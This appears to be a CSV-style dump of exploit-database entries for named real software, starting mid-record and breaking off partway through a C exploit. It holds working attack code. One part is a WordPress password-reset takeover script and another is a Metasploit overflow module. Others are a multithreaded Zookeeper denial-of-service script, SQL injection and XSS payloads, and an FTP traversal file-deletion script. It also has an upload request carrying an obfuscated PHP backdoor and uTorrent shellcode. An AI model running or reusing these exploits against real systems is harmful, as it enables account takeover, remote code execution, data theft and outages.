if(!preg_match('/.+mailid=(\d+).+?Reset/s', $PAGE, $match)) die(""[!] failed to find resetmail try raising the wait-time right above\n""); 	$MAILID=$match[1];  	echo ""[-] fetching resetmail $MAILID\n"";  	$WHOLEMAIL=file_get_contents(""http://www.nospamfor.us/mail.php?mailid=$MAILID&sitename=nospamfor.us&mailbox=$MBOX""); 	if(!preg_match('/key=([A-z0-9]+)/', $WHOLEMAIL, $match)) die(""[!] could not find resetkey in $WHOLEMAIL\n""); 	$KEY=$match[1];  	echo ""[X] found resetkey $KEY\n""; 	echo ""[-] resetting password\n"";  	$req = ""GET $PATH/wp-login.php?action=rp&key=$KEY HTTP/1.1\r\nHost: $HOST\r\nUser-Agent:$UA\r\nConnection: close\r\n\r\n""; 	fputs($suck, $req); 	while(!feof($suck)) { 		#echo ""D:"". 		fgets($suck); 	} 	fclose($suck);  	echo ""[-] calculating password\n""; 	$SEED=false; 	if(file_exists('wp261_php520')) { 		$SEED=`grep -F $KEY wp261*|cut -d : -f 1`; 		echo ""[X] got seed $SEED from rainbow table\n""; 	} 	$PASSWORD=calcpass($KEY, $SEED);  	echo ""[X] all done.""; 	exit;  	function calcpass($resetkey, $seed = false) { 		mt_srand(2); $a = mt_rand(); mt_srand(3); $b = mt_rand(); 		define('BUGGY', $a == $b); 		echo ""[-] wpress password computation. runnig in "".(BUGGY?'fast':'slow')."" mode\n"";  		echo ""[+] got key $resetkey via mail\n"";  		if(!$seed) $seed = getseed($resetkey);  		if($seed===false) die(""[!] seed not found :( try using identical php version (< 5.2.5)\n"");  		mt_srand($seed); 		echo ""[-] seed for key "".wp_generate_password(20,false)."" is $seed\n""; 		$pass = wp_generate_password(); 		echo ""[+] new credentials are admin:$pass\n""; 		return $pass; 	}  	function wp_generate_password($length = 12, $special_chars = true) { 		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 		if ( $special_chars ) 			$chars .= '!@#$%^&*()';  		$password = ''; 		for ( $i = 0; $i < $length; $i++ ) 			$password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); 		return $password; 	}   	function getseed($resetkey) { 		echo ""[-] calculating rand seed for $resetkey (this will take a looong time)""; 		$max = pow(2,(32-BUGGY)); 		for($x=0;$x<=$max;$x++) { 			$seed = BUGGY ? ($x << 1) + 1 : $x; 			mt_srand($seed); 			$testkey = wp_generate_password(20,false); 			if($testkey==$resetkey) { echo ""o\n""; return $seed; }  			if(!($x % 10000)) echo "".""; 		} 		echo ""\n""; 		return false; 	}  ?>  # milw0rm.com [2008-09-10]",WordPress Core,1
6300,"Pluck CMS 4.5.2 - Multiple Local File Inclusions Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-037   Application:                    Pluck CMS Versions Affected:              4.5.2 Vendor URL:                     http://www.pluck-cms.org/ Bug:                            Multiple Local File Include Exploits:                       YES Reported:                       28.07.2008 Vendor Response:                03.08.2008 Solution:                       YES Date of Public Advisory:        25.08.2008 Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)    Description ***********  Pluck CMS has Multiple Local File Include vulnerabilities.     Details *******  1. Local File Include vulnerabilities found in script data/inc/themes/predefined_variables.php  Vulnerable GET parameters ""blogpost"", ""cat"" and ""file"".  First discovered by AmnPardaz Security Research Team [http://www.bugreport.ir/index_48.htm]. Vendor fixed vulnerability in version 4.5.2 by blocking directly access to this file [http://www.pluck-cms.org/releasenotes.php#4.5.2].  However, attacker still can exploit this vulnerability from index.php file.  Code [line 15-46] ----------------- #################################################  //Make sure the file isn't accessed directly if((!ereg(""index.php"", $_SERVER['SCRIPT_FILENAME'])) && (!ereg(""admin.php"", $_SERVER['SCRIPT_FILENAME'])) && (!ereg(""install.php"", $_SERVER['SCRIPT_FILENAME'])) && (!ereg(""login.php"", $_SERVER['SCRIPT_FILENAME']))){     //Give out an ""access denied"" error     echo ""access denied"";     //Block all other code     exit(); }  //Include Translation data include (""data/settings/langpref.php""); include (""data/inc/lang/$langpref""); //Get Site-title $sitetitle = file_get_contents(""data/settings/title.dat"");  //Get the page-data $filetoread = $_GET['file']; $album = $_GET['album']; $blogpost = $_GET['blogpost']; $cat = $_GET['cat'];  if (($filetoread) && (file_exists(""data/content/$filetoread""))) { include ""data/content/$filetoread""; }  elseif ($album) { $title = $album; }  elseif (($blogpost) && (file_exists(""data/blog/$cat/posts/$blogpost""))) { include(""data/blog/$cat/posts/$blogpost""); }  elseif ((!file_exists(""data/content/$filetoread"")) && (!$album) && (!$blogpost)) { $title = $lang_front1; $content = $lang_front2; }  #################################################  Pluck CMS has security module that checks for hacking attempts and blocks them.  Code ---- #################################################  //Remote File Inclusion //Check for strange characters in $_GET keys //All keys with ""/"" or "":"" are blocked, so it becomes virtually impossible to inject other pages or websites   foreach ($_GET as $get_key => $get_value) {     if ((ereg(""/"", $get_value)) || (ereg("":"", $get_value))) {     eval(""unset(\${$get_key});"");     die(""A hacking attempt has been detected. For security reasons, we're blocking any code execution.""); }   }  #################################################  This vulnerability can be exploited only on systems that accept backslash as a path separator.  Example:  http://[server]/[installdir]/index.php?file=..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini http://[server]/[installdir]/index.php?blogpost=..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini http://[server]/[installdir]/index.php?blogpost=DSecRG&cat=..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini%00   2. Local File Include vulnerabilities found in script data/inc/blog_include_react.php  Vulnerable GET parameters ""blogpost"" and ""cat"".  Code [line 15-30] ----------------- #################################################  //Make sure the file isn't accessed directly if((!ereg(""index.php"", $_SERVER['SCRIPT_FILENAME'])) && (!ereg(""admin.php"", $_SERVER['SCRIPT_FILENAME'])) && (!ereg(""install.php"", $_SERVER['SCRIPT_FILENAME'])) && (!ereg(""login.php"", $_SERVER['SCRIPT_FILENAME']))){     //Give out an ""access denied"" error     echo ""access denied"";     //Block all other code     exit(); }  //Predefined variable $blogpost = $_GET['blogpost']; $cat = $_GET['cat']; $pageback = $_GET['pageback']; list($reactiondir, $extension) = explode(""."", $blogpost);  //Include the blogpost include(""data/blog/$cat/posts/$blogpost"");  #################################################  Attacker can exploit vulnerability from index.php file.  This vulnerability can be exploited only on systems that accept backslash as a path separator.  Example:  http://[server]/[installdir]/index.php?blogpost=..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini http://[server]/[installdir]/index.php?blogpost=DSecRG&cat=..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini%00    Solution ********  Vendor fix this flaw on 22.08.2008. New version of Pluck CMS 4.5.3 can be download here:  http://www.pluck-cms.org/download.php  Release notes:  http://www.pluck-cms.org/releasenotes.php#4.5.3    About *****  Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.   Contact:    research [at] dsec [dot] ru             http://www.dsec.ru (in Russian)  # milw0rm.com [2008-08-25]",Pluck CMS,1
11109,"Audiotran 1.4.1 - '.pls' Local Stack Overflow (Metasploit) require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote  Rank = GoodRanking   include Msf::Exploit::FILEFORMAT  include Msf::Exploit::Remote::Seh   def initialize(info = {})   super(update_info(info,    'Name'           => 'Audiotran 1.4.1 (PLS File) Stack Overflow.',    'Description'    => %q{      This module exploits a stack-based buffer overflow in Audiotran 1.4.1.      An attacker must send the file to victim and the victim must open the file.      Alternatively it may be possible to execute code remotely via an embedded      PLS file within a browser, when the PLS extention is registered to Audiotran.      This functionality has not been tested in this module.    },    'License'        => MSF_LICENSE,    'Author'   =>     [      'Sebastien Duquette',      'dookie',     ],    'Version'        => '$Revision: 8091 $',    'References'     =>     [      [ 'URL', 'http://www.exploit-db.com/exploits/11079' ],     ],    'Payload'        =>     {      'Space'    => 6000,      'BadChars' => ""\x00\x0a\x3d"",      'StackAdjustment' => -3500,     },    'Platform' => 'win',    'Targets'        =>     [      [ 'Windows Universal', { 'Ret' => 0x10101A3E } ], #p/p/r in rsaadjd.tmp     ],    'Privileged'     => false,    'DisclosureDate' => '09 Jan 2010',    'DefaultTarget'  => 0))     register_options(     [      OptString.new('FILENAME', [ true, 'The file name.',  'audiotran.pls']),     ], self.class)   end   def exploit    sploit = rand_text_alpha_upper(1308)   sploit << generate_seh_payload(target.ret)   sploit << rand_text_alpha_upper(8000)    print_status(""Creating '#{datastore['FILENAME']}' file ..."")    file_create(sploit)   end  end",Audiotran,1
42294,"Zookeeper 3.5.2 Client - Denial of Service #!/usr/bin/python  # Exploit Title: Zookeeper Client Denial Of Service (Port 2181) # Date: 2/7/2017 # Exploit Author: Brandon Dennis # Email: bdennis@mail.hodges.edu # Software Link: http://zookeeper.apache.org/releases.html#download # Zookeeper Version: 3.5.2 # Tested on: Windows 2008 R2, Windows 2012 R2 x64 & x86 # Description: The wchp command to the ZK port 2181 will gather open internal files by each session/watcher and organize them for the requesting client.  #	This command is CPU intensive and will cause a denial of service to the port as well as spike the CPU of the remote machine to 90-100% consistently before any other traffic.  #	The average amount of threads uses was 10000 for testing. This should work on all 3.x+ versions of Zookeeper. #	This should effect Linux x86 & x64 as well    import time import os import threading import sys import socket  numOfThreads = 1 exitStr = ""n"" stop_threads = False threads = [] ipAddress = ""192.168.1.5"" #Change this port = 2181  def sendCommand(ipAddress, port): 	try: 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 		s.connect((ipAddress, port)) 		s.send(""wchp\r"".encode(""utf-8"")) 		s.recv(1024) 		s.send(""wchc\r"".encode(""utf-8"")) 		s.close() 	except: 		pass  	 def runCMD(id, stop, ipAddress, port): 	while True: 		sendCommand(ipAddress, port) 		if stop(): 			break 	return 	 def welcomeBanner(): 	banner = """""" _______   __  _____               _                |___  | | / / /  __ \             | |                  / /| |/ /  | /  \/_ __ __ _ ___| |__   ___ _ __    / / |    \  | |   | '__/ _` / __| '_ \ / _ | '__| ./ /__| |\  \ | \__/| | | (_| \__ | | | |  __| |    \_____\_| \_/  \____|_|  \__,_|___|_| |_|\___|_|                                                                         By: Brandon Dennis  		 Email: bdennis@mail.hodges.edu 				 """""" 	print(banner) 	  welcomeBanner() numOfThreads = int(input(""How many threads do you want to use: "")) print (""Startin Up Threads..."")	 for i in range(numOfThreads): 	t = threading.Thread(target=runCMD, args=(id, lambda: stop_threads, ipAddress, port)) 	threads.append(t) 	t.start() print(""Threads are now started..."") 	  while exitStr != ""y"": 	inpt = input(""Do you wish to stop threads(y): "") 	 	if inpt == ""y"": 		exitStr = ""y""  print(""\nStopping Threads..."") stop_threads = True		 for thread in threads: 	thread.join() 		 print(""Threads are now stopped..."") sys.exit(0);",Zookeeper,1
12424,"Acart 2.0 Shopping Cart - Software Backup Dump ========================================================================================                   | # Title    : Acart <= 2.0 Shopping Cart Software Backup Dump Vulnerability            | # Author   : indoushka                                                                                                               | # Home     : www.iqs3cur1ty.com                                                                                                                                                                                                                         | # Bug      : Backup                                                              ======================      Exploit By indoushka       =================================  # Exploit  :          1 - http://127.0.0.1/acart1_0/acart.mdb             2- http://127.0.0.1/acart1_0/signin.asp         you find the information in the db. version 2.0 uses ""acart2_0.mdb""                      Dz-Ghost Team ===== Saoucha * Star08 * Redda * theblind74 * XproratiX * onurozkan * n2n * Meher Assel ==================== Greetz :  Exploit-db Team :  (loneferret+Exploits+dookie2000ca) all my friend : His0k4 * Hussin-X * Rafik (www.Tinjah.com) * Yashar (www.sc0rpion.ir) SoldierOfAllah (www.m4r0c-s3curity.cc) Stake (www.v4-team.com) * r1z (www.sec-r1z.com) * D4NB4R http://www.ilegalintrusion.net/foro/ www.securityreason.com * www.sa-hacker.com *  www.alkrsan.net * www.mormoroth.net * MR.SoOoFe * ThE g0bL!N ------------------------------------------------------------------------------------------------------------------------",Shopping Cart,1
22630,"Apple QuickTime/Darwin Streaming MP3Broadcaster - ID3 Tag Handling source: https://www.securityfocus.com/bid/7660/info  MP3Broadcaster is shipped as part of Darwin Streaming Server software.  MP3Broadcaster has been reported prone to a vulnerability when processing malicious ID3 tags. This is likely due to insufficient sanity checks performed when handling signed integer values contained within MP3 file ID3 tags.  First create the sample configuration file: $ echo -e ""\n"" > test.conf  Then create a playlist file: $ echo -e ""*PLAY-LIST*\nsong.mp3"" > mp3playlist.ply  Create a specially crafted mp3 file: $ echo -e ""ID3\x03\x00\x00\x00\x00\x0f\x0fTPE1\xff\xaa\xaa\xbb\x00\x00\x00\x00\x00\x00  "" > song.mp3",Apple QuickTime/Darwin Streaming MP3Broadcaster,1
43410,"D3DGear 5.00 Build 2175 - Buffer Overflow (PoC) #!/usr/bin/python   # # Exploit Author: bzyo # Twitter: @bzyo_ # Exploit Title: D3DGear 5.00 Build 2175 - Buffer Overflow # Date: 07-11-2017 # Vulnerable Software: D3DGear 5.00 Build 2175 # Vendor Homepage: http://www.d3dgear.com/ # Version: 5.00 Build 2175 # Software Link: http://www.d3dgear.com/products.htm # Tested On: Windows 7 x86 # # # PoC: generate crash.txt, open program, select broadcast, paste crash.txt contents in stream key # # app crashes; 00420042 Pointer to next SEH record; no eip overwrite; one unicode ppr pointer #    file = ""crash.txt""  buffer = ""A""* 1284 + ""B""*4 writeFile = open (file, ""w"") writeFile.write( buffer ) writeFile.close()",D3DGear,1
30575,BOINC 5.10.20 - 'forum_forum.php?id' Cross-Site Scripting source: https://www.securityfocus.com/bid/25644/info  BOINC (Berkeley Open Infrastructure for Network Computing) is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  These issues affects BOINC 5.10.20; other versions may also be affected.   http://www.example.com/forum_forum.php?id=[XSS],BOINC,1
36997,"CMSimple 3.3 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/52661/info  CMSimple is prone to a cross-site scripting vulnerability because it fails to sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  CMSimple 3.3 is vulnerable; other versions may also be affected.   http://www.example.com//cmsimple/cmsimplexh152/?'""</script><script>alert(document.cookie)</script>",CMSimple,1
18309,"VideoLAN VLC Media Player 1.1.11 - '.amr' Denial of Service (PoC) #!/usr/bin/perl ## # Exploit Title: VLC media player v1.1.11 (.amr) Local Crash PoC # Date: 04.01.2012 # Author: Fabi@habsec (hapsec@gmail.com) # Software Link: http://sourceforge.net/projects/vlc/files/1.1.11/win32/vlc-1.1.11-win32.exe # Version: 1.1.11 # Tested on: Windows 7 x86 English # # Description: Unhandled Access Violation Exception loading generated .amr file #              - 1.1.10 not affected! # ## # # # system(""title VLC .amr crash PoC""); system(""cls""); print ""\n"";                   print "" [*] Name : VLC media player v1.1.11 (Adaptive Multi-Rate)\n""; print "" [*] Exploit : Local Crash PoC                            \n""; sleep(2); print ""\n""; my $amr_boof = ""\x23\x21\x41\x4D\x52""; # Treat as AMR  $amr_boof .= ""\x41""x1000; # j4f open(file , "">"", ""b00f.amr""); print file $amr_boof; print ""  [+] File successfully created! Open in VLC or drag to playlist..\n"" or die print ""\n Wuups- Could not create File.. ""; close(file); #  #Hannibal ante portas",VideoLAN VLC Media Player,1
28339,"Anychart 3.0 - 'Password' SQL Injection source: https://www.securityfocus.com/bid/19330/info  anychart is prone to an SQL-injection vulnerability because it fails to properly sanitize user-supplied input before using it in an SQL query.   A successful attack could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  This issue affects version 3.0; earlier versions may also be vulnerable.  http://www.example.com/path/login.asp  Use this information: Username:admin Password:&#039;OR&#039;",Anychart,1
45176,"iSmartViewPro 1.5 - 'Password' Buffer Overflow # Exploit Title: iSmartViewPro 1.5  - 'Password' Buffer Overflow # Discovery by: Javier Enrique Rodriguez Gutierrez # Discovery Date: 2018-08-09 # Vendor Homepage: https://securimport.com/ # Software Link: https://securimport.com/university/videovigilancia-ip/software/493-software-ismartviewpro-v1-5 # Tested Version: 1.5 # Vulnerability Type: Buffer Over Flow Local # Tested on OS: Windows 7 Professional x64 es    # Steps to Produce the BoF:  # 1.- Run python code : python generate.py # 2.- Open generate.txt and copy content to clipboard # 3.- Open iSmartViewPro # 4.- clic button ""+"" # 5.- Select ""add device manually"" # 6.- device alias -> ""admin"" # 7.- DNS/IP/DID -> ""0.0.0.0"" # 8.- acount -> ""admin"" # 9.- paste ClipBoard on ""Password"" # 10.- Save # 11.- BoF   #!/usr/bin/env python # -*- coding: utf-8 -*- buffer = ""\x41"" * 447 eip = ""\x42"" * 4 f = open (""generate.txt"", ""w"") f.write(buffer + eip) f.close()",iSmartViewPro,1
34514,"WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload Summary: WordPress Slideshow Gallery plugin version 1.4.6 suffers from a remote shell upload vulnerability.  Found by: Jesus Ramirez Pichardo   @whitexploit   http://whitexploit.blogspot.mx/ Date: 2014-08-28 Vendor Homepage: http://tribulant.com/ Software: Slideshow Gallery Version: 1.4.6 Software Link: http://downloads.wordpress.org/plugin/slideshow-gallery.1.4.6.zip  Tested on: Windows 7 OS, Wordpress 3.9.2 and Chrome Browser.  Description:  I found a serious security vulnerability in the Slideshow Gallery plugin. This bug allows an attacker to upload any php file remotely to the vulnerable website (administrator by default). I have tested and verified that having the current version of the plugin installed in a WordPress installation will allow any registered user (Administrator, Editor, Author, Contributor and Subscriber), to upload a PHP shell to exploit the host system.  Backdoor location: http://VICTIM/wordpress/wp-content/uploads/slideshow-gallery/backdoor.php  Today (2014-08-29), I did the notification to vendor and they gave me feedback about the vulnerability by email. The vendor has released a patch a few hours ago. (SlideShow Gallery version 1.4.7 at https://wordpress.org/plugins/slideshow-gallery/changelog).  Proof of Concept (PoC):  1. An attacker uploads a PHP shell file (i.e. backdoor.php):  POST http://192.168.31.128/wordpress/wp-admin/admin.php?page=slideshow- slides&method=save HTTP/1.1 Host: 192.168.31.128 Connection: keep-alive Content-Length: 2168 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Origin: http://192.168.31.128 User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEGMugMZ1CVkRzbxV DNT: 1 Referer: http://192.168.31.128/wordpress/wp-admin/admin.php?page=slideshow- slides&method=save Accept-Encoding: gzip,deflate Accept-Language: es-ES,es;q=0.8,en;q=0.6,it;q=0.4,und;q=0.2 Cookie: wordpress_a8ed7709a5b8081c924ceda6269a7962=master%7C1409465845%7C9ee160d2851bbcdaa2865 e9010d92d46; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_a8ed7709a5b8081c924ceda6269a7962=master%7C1409465845%7C0565892d6d7 f9de1022e4ad95b45d4ac; wp-settings-1=libraryContent%3Dupload%26editor%3Dtinymce; wp- settings-time-1=1409293045 ------WebKitFormBoundaryEGMugMZ1CVkRzbxV Content-Disposition: form-data; name=""Slide[id]""  ------WebKitFormBoundaryEGMugMZ1CVkRzbxV  Content-Disposition: form-data; name=""Slide[order]""  ------WebKitFormBoundaryEGMugMZ1CVkRzbxV  Content-Disposition: form-data; name=""Slide[title]""  Test Shell Upload  ------WebKitFormBoundaryEGMugMZ1CVkRzbxV  Content-Disposition: form-data; name=""Slide[description]""  ------WebKitFormBoundaryEGMugMZ1CVkRzbxV  Content-Disposition: form-data; name=""Slide[showinfo]""  both ------WebKitFormBoundaryEGMugMZ1CVkRzbxV  Content-Disposition: form-data; name=""Slide[iopacity]""  70 ------WebKitFormBoundaryEGMugMZ1CVkRzbxV  Content-Disposition: form-data; name=""Slide[galleries][]""  1 ------WebKitFormBoundaryEGMugMZ1CVkRzbxV Content-Disposition: form-data; name=""Slide[type]""  file ------WebKitFormBoundaryEGMugMZ1CVkRzbxV Content-Disposition: form-data; name=""image_file""; filename=""backdoor.php""  Content-Type: application/octet-stream  <?php $kvgk = str_replace(""y"","""",""ysytyry_yreypylyayce""); $dawj=""pdGV4cGxvaXQnO2VzhjaGzh8gJzwnLiRrzhLic+JzzhtldmFsKGJhc2U2NF9kZWNvZGUz""; $asrp=""gnJywnKycpLCBqb2luKGFycmF5X3NsaWNlKCRhLCRjKzhCRhKS0zKSkpKSk7ZWzhNobyAnPC8nLzhiR rLic+Jzt9""; $gxfr=""hocHJlZ19yzhZXBsYzhWNlKzhGFycmF5KCcvW15cdz1cc1zh0vJywnzhLzh1xzzhLycpLCBhcnJheSz h""; $fdcd=""JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihzhyZXNldCgkYSk9PSd3zhaCcgJiYgJGMzhoJGEpPjMpe zhyRrPSd""; $uuod = $kvgk(""j"", """", ""bjase6j4j_jdjejcjojde""); $qcon = $kvgk(""av"","""",""avcraveaavteav_avfavuavnavcavtiavoavn""); $rpgy = $qcon('', $uuod($kvgk(""zh"", """", $fdcd.$dawj.$gxfr.$asrp))); $rpgy(); ?> ------WebKitFormBoundaryEGMugMZ1CVkRzbxV Content-Disposition: form-data; name=""Slide[image_url]""  ------WebKitFormBoundaryEGMugMZ1CVkRzbxV Content-Disposition: form-data; name=""Slide[uselink]""  N  ------WebKitFormBoundaryEGMugMZ1CVkRzbxV Content-Disposition: form-data; name=""Slide[link]""  ------WebKitFormBoundaryEGMugMZ1CVkRzbxV  Content-Disposition: form-data; name=""Slide[linktarget]""  self ------WebKitFormBoundaryEGMugMZ1CVkRzbxV Content-Disposition: form-data; name=""submit""  Save Slide                       ------WebKitFormBoundaryEGMugMZ1CVkRzbxV--                        2. The backdoor is located at http://VICTIM/wordpress/wp-content/uploads/slideshow-gallery/backdoor.php  3. The attacker uses a security tool (i.e. weevely) in order to communicate with the backdoor.  #weevely http://VICTIM/wordpress/wp-content/uploads/slideshow-gallery/backdoor.php whitexploit  Now the attacker has a “telnet-like console”. Finally, the attacker has the remote control of the vulnerable website.  Vulnerability Disclosure Timeline: 2014-08-28: Discovered vulnerability 2014-08-29: Vendor Notification (support@tribulant.com)  2014-08-29: Vendor Response/Feedback 2014-08-29: Vendor Fix/Patch 2014-08-30: Public Disclosure",WordPress Plugin Slideshow Gallery,1
31360,"MailEnable 3.13 - IMAP Service Multiple Remote Vulnerabilities source: https://www.securityfocus.com/bid/28145/info  MailEnable is prone to multiple remote vulnerabilities in the IMAP service, including:  - Multiple buffer-overflow vulnerabilities. - Multiple denial-of-service vulnerabilities due to a NULL-pointer exception.  An attacker may leverage these issues to execute arbitrary code in the context of the running application or to crash the application, causing a denial of service.  These issues affect MailEnable 3.13; other versions may also be vulnerable.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/31360-1.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/31360-2.pl",MailEnable,1
24246,"SCI Photo Chat 3.4.9 - Cross-Site Scripting source: https://www.securityfocus.com/bid/10648/info  SCI Photo Chat is reported susceptible to a cross-site scripting vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied URI input.  The web server component of SCI Chat server will display an error message when it receives an HTTP request for an invalid file. This error message includes the complete unsanitized content of the original request.  A remote attacker can exploit this issue by creating a malicious link to the vulnerable application that includes hostile HTML and script code. If this link were followed by an unsuspecting user, the hostile code may be rendered in the their web browser. This would occur in the security context of the web server and may allow for theft of cookie-based authentication credentials or other attacks.   http://www.example.com:1235/<script>alert(document.cookie);</script>",SCI Photo Chat,1
26064,"Naxtor Shopping Cart 1.0 - 'Shop_Display_Products.php' SQL Injection source: https://www.securityfocus.com/bid/14456/info  Naxtor Shopping Cart is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  http://www.example.com/shop_display_products.php?cat_id='",Naxtor Shopping Cart,1
35293,"Joomla! Component com_virtuemart 1.1.6 - SQL Injection source: https://www.securityfocus.com/bid/46070/info  The VirtueMart eCommerce component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  VirtueMart eCommerce 1.1.6 is vulnerable; other versions may also be affected.   http://www.example.com/index.php?category_id=&page=shop.browse&option=com_virtuemart&Itemid=1&keyword1=hand&search_op=and&keyword2=&search_limiter=anywhere&search=Search&search_category=3 AND $BLIND_SQL --",Joomla! Component com_virtuemart,1
8200,"GuildFTPd FTP Server 0.999.14 - Remote Delete Files #!/usr/bin/perl # Exploit: GuildFTPd FTP Server Version 0.x.x Remote Delete Files # # More detail for the vulnerability => http://secunia.com/advisories/32218/ #  # 2) A vulnerability is caused due to an input validation error when handling FTP ""DELE""  # requests. This can be exploited to escape the FTP root and delete arbitrary files on  # the system via directory traversal attacks using the ""\.."" character sequence. # # Author: Jonathan Salwan # Mail: submit [AT] shell-storm.org # Web: http://www.shell-storm.org   use IO::Socket; print ""[+] Author : Jonathan Salwan \n""; print ""[+] Soft: Guild FTP Server V0.x.x\n""; print ""[+] Exploit: Remote Delete File\n"";  	if (@ARGV < 5) 		{  		print ""[*] Usage: <guildftp.pl> <host> <port> <login> <password> <file>\n"";  		print ""[*] Exemple: guildftp.pl 127.0.0.1 21 jonathan salwan ..\\\\test.txt\n"";  		exit; 		}  	$ip = $ARGV[0]; 	$port = $ARGV[1]; 	$user = $ARGV[2]; 	$pass = $ARGV[3]; 	$file = $ARGV[4];  $socket = IO::Socket::INET->new( Proto => ""tcp"", PeerAddr => ""$ip"", PeerPort => ""$port"") || die ""\n[-] Connecting: Failed!\n"";  print ""\n[+] Connecting: Ok!\n""; print ""[+] Sending request...\n"";  	print $socket ""USER $user\n""; 	print $socket ""PASS $pass\n""; 	print $socket ""DELE $file\n"";  		sleep(5); 		close($socket);  print ""[+]Done!\n"";  # milw0rm.com [2009-03-10]",GuildFTPd FTP Server,1
15611,"JDownloader Webinterface - Source Code Disclosure # Exploit Title: JDownloader Webinterface Source Code Disclosure # Date: 11/24/10 # Author: Sil3nt_Dre4m # Software Link: http://jdownloader.org # Version: Latest (0.9.850) # Tested on: Windows, Linux  JDownloader WebInterface is vulnerable to a source code disclosure exploit to due not properly sanitizing user input.  Linux:  http://127.0.0.1:8765/index.tmpl/  Windows:  http://127.0.0.1:8765/index.tmpl. http://127.0.0.1:8765/index.tmpl::$DATA http://127.0.0.1:8765/index.tmpl/",JDownloader Webinterface,1
3296,"μTorrent (uTorrent) 1.6 build 474 - 'announce' Key Remote Heap Overflow /*  * This is a PoC remote exploit for uTorrent 1.6  *  * Author:   * defsec <defacedsecurity@hotmail.com>  * http://www.defacedsecurity.com  *   *  * Works on XP SP1 and  w2k sp1-4  * */  #include <stdio.h> #include <stdlib.h>  #define NASIZE 4880  unsigned char nice_announce[NASIZE]; unsigned char xorops[]=""\x33\xc0\x33\xdb"";  // win32_exec - EXITFUNC=process CMD=calc Size=343 Encoder=PexAlphaNum // Restricted Character 0x00 unsigned char shellcode[]= ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"" ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"" ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"" ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"" ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"" ""\x42\x50\x42\x50\x42\x30\x4b\x38\x45\x34\x4e\x43\x4b\x48\x4e\x47"" ""\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x38\x4f\x34\x4a\x51\x4b\x48"" ""\x4f\x55\x42\x42\x41\x30\x4b\x4e\x49\x44\x4b\x58\x46\x43\x4b\x58"" ""\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x48\x42\x4c"" ""\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"" ""\x46\x4f\x4b\x43\x46\x45\x46\x42\x46\x50\x45\x37\x45\x4e\x4b\x38"" ""\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x30\x4b\x54"" ""\x4b\x38\x4f\x35\x4e\x51\x41\x50\x4b\x4e\x4b\x48\x4e\x41\x4b\x48"" ""\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x42\x46\x50\x43\x4c\x41\x53"" ""\x42\x4c\x46\x36\x4b\x58\x42\x54\x42\x53\x45\x48\x42\x4c\x4a\x37"" ""\x4e\x30\x4b\x48\x42\x34\x4e\x50\x4b\x58\x42\x57\x4e\x51\x4d\x4a"" ""\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x50\x4b\x38\x42\x58\x42\x4b"" ""\x42\x30\x42\x50\x42\x30\x4b\x38\x4a\x56\x4e\x43\x4f\x35\x41\x53"" ""\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37"" ""\x42\x35\x4a\x36\x50\x47\x4a\x4d\x44\x4e\x43\x47\x4a\x36\x4a\x49"" ""\x50\x4f\x4c\x48\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x46"" ""\x4e\x46\x43\x46\x42\x30\x5a"";  